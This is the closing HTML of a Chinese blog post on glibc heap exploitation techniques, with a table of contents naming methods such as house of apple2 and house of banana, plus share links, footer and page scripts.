class="toc-text">largebin attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-IO-2-1-stdout-%E6%B3%84%E9%9C%B2%E5%9C%B0%E5%9D%80"><span class="toc-number">5.</span> <span class="toc-text">利用_IO_2_1_stdout_泄露地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87off-by-null%E8%BF%9B%E8%A1%8Cunlink"><span class="toc-number">6.</span> <span class="toc-text">通过off_by_null进行unlink</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-botcake"><span class="toc-number">7.</span> <span class="toc-text">house of botcake</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-kiwi"><span class="toc-number">8.</span> <span class="toc-text">house of kiwi(&lt;&#x3D; 2.36)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-cat"><span class="toc-number">9.</span> <span class="toc-text">house of cat</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-%E7%A7%A6%E6%9C%88%E6%B1%89%E5%85%B3"><span class="toc-number">10.</span> <span class="toc-text">house of 秦月汉关</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90"><span class="toc-number">10.1.</span> <span class="toc-text">例子</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-apple2"><span class="toc-number">11.</span> <span class="toc-text">house of apple2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-husk"><span class="toc-number">12.</span> <span class="toc-text">house of husk</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-pig"><span class="toc-number">13.</span> <span class="toc-text">house of pig</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-emma"><span class="toc-number">14.</span> <span class="toc-text">house of emma</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%AB%E6%8C%81tls-dtor-list%EF%BC%8C%E5%88%A9%E7%94%A8-call-tls-dtors%E6%8B%BF%E5%88%B0%E6%9D%83%E9%99%90"><span class="toc-number">15.</span> <span class="toc-text">劫持tls_dtor_list，利用__call_tls_dtors拿到权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-apple3-house-of-%E4%B8%80%E9%AA%91%E5%BD%93%E5%8D%83"><span class="toc-number">16.</span> <span class="toc-text">house of apple3 + house of 一骑当千</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-some"><span class="toc-number">17.</span> <span class="toc-text">house of some</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-banana"><span class="toc-number">18.</span> <span class="toc-text">house of banana</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87puts%E5%87%BD%E6%95%B0%E6%9D%A5%E8%A7%A6%E5%8F%91IO%E9%93%BE"><span class="toc-number">19.</span> <span class="toc-text">通过puts函数来触发IO链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-some%E6%94%B9%E8%BF%9B%E7%89%88"><span class="toc-number">20.</span> <span class="toc-text">house of some改进版</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-some2"><span class="toc-number">21.</span> <span class="toc-text">house of some2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">21.1.</span> <span class="toc-text">参考文章</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://qanux.github.io/2023/11/13/%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%A0%86%E5%88%A9%E7%94%A8%E7%AC%94%E8%AE%B0/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://qanux.github.io/2023/11/13/%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%A0%86%E5%88%A9%E7%94%A8%E7%AC%94%E8%AE%B0/&text=高版本glibc堆利用笔记"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://qanux.github.io/2023/11/13/%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%A0%86%E5%88%A9%E7%94%A8%E7%AC%94%E8%AE%B0/&title=高版本glibc堆利用笔记"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://qanux.github.io/2023/11/13/%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%A0%86%E5%88%A9%E7%94%A8%E7%AC%94%E8%AE%B0/&is_video=false&description=高版本glibc堆利用笔记"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=高版本glibc堆利用笔记&body=Check out this article: https://qanux.github.io/2023/11/13/%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%A0%86%E5%88%A9%E7%94%A8%E7%AC%94%E8%AE%B0/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://qanux.github.io/2023/11/13/%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%A0%86%E5%88%A9%E7%94%A8%E7%AC%94%E8%AE%B0/&title=高版本glibc堆利用笔记"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://qanux.github.io/2023/11/13/%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%A0%86%E5%88%A9%E7%94%A8%E7%AC%94%E8%AE%B0/&title=高版本glibc堆利用笔记"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://qanux.github.io/2023/11/13/%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%A0%86%E5%88%A9%E7%94%A8%E7%AC%94%E8%AE%B0/&title=高版本glibc堆利用笔记"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://qanux.github.io/2023/11/13/%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%A0%86%E5%88%A9%E7%94%A8%E7%AC%94%E8%AE%B0/&title=高版本glibc堆利用笔记"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://qanux.github.io/2023/11/13/%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%A0%86%E5%88%A9%E7%94%A8%E7%AC%94%E8%AE%B0/&name=高版本glibc堆利用笔记&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://qanux.github.io/2023/11/13/%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%A0%86%E5%88%A9%E7%94%A8%E7%AC%94%E8%AE%B0/&t=高版本glibc堆利用笔记"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2024
    Qanux
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/friend/">friends</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->


 
  <link
    rel="preload"
    href="/lib/font-awesome/css/all.min.css"
    as="style"
    onload="this.onload=null;this.rel='stylesheet'"
  />
  <noscript
    ><link
      rel="stylesheet"
      href="/lib/font-awesome/css/all.min.css"
  /></noscript>


    <!-- jquery -->

  
<script src="/lib/jquery/jquery.min.js"></script>





<!-- clipboard -->

  
    
<script src="/lib/clipboard/clipboard.min.js"></script>

  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
